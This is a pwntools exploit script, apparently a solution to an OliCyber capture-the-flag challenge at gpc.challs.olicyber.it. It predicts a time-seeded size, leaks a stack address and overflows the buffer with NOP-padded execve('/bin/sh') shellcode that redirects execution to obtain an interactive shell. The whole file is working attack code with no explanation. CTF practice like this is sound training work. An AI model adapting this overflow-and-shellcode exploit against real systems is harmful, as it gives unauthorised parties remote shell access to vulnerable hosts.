#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from subprocess import check_output
import time

exe = context.binary = ELF(args.EXE or 'generatore_poco_casuale')

host = args.HOST or 'gpc.challs.olicyber.it'
port = int(args.PORT or 10104)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
b *main+168
b *randomGenerator+149
b *randomGenerator+194
'''.format(**locals())


def get_random(seed: int, index: int) -> int:
    rnd = int(check_output(f"./get_rnd {seed} {index}", shell=True).decode())
    return (rnd % 125) * 8



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

context.arch = 'amd64'
context.os = 'linux'
index, sz = 0, 0
shellcode = asm("""
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    mov rsi, 0x00
    mov rdx, 0x00
    mov rax, 59
    syscall
""")

log.info(f'Shellcode length: {hex(len(shellcode))}')
io = start()

while sz < len(shellcode):
    sz = get_random(int(time.time()), index)
    index += 1

    log.info(f'Size: {hex(sz)}')

    io.recvlines(2)
    stackAddr = int(io.recvline().strip().decode().split(": ")[-1])
    io.recvline()

    log.info(f'Stack Addr: {hex(stackAddr)}')
    
    if sz < len(shellcode):
        log.warning('Insufficent size, reloading...')
        io.sendline(b's')

log.info('Injecting Shellcode...')

inject_len = (sz + 16)
payload = b'\x90' * 8 + shellcode + b'\x90' * (inject_len - len(shellcode)) + p64(stackAddr) + b'\x91' * 32

io.sendline(payload + p64(stackAddr))

io.interactive()